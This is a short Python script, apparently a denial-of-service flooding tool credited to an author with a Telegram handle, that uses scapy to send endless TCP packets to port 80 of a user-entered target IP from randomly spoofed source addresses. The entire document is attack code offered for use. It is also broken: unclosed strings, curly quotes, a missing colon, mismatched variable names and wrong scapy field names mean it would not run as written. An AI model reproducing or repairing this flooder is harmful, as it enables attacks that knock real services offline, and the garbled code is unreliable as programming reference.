Import random
from scapy.all import *
target_IP = input("Enter IP address of Target: ")
i = 1
os.system("clear)
print "Author :Ammr
print "telegram :@YYY_161
while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = “.”
   Source_ip = a + dot + b + dot + c + dot + d
   
   for source_port in range(1, 65535)
      IP1 = IP(source_IP = source_IP, destination = target_IP)
      TCP1 = TCP(srcport = source_port, dstport = 80)
      pkt = IP1 / TCP1
      send(pkt,inter = .001)
      
      print ("packet sent ", i)
         i = i + 1
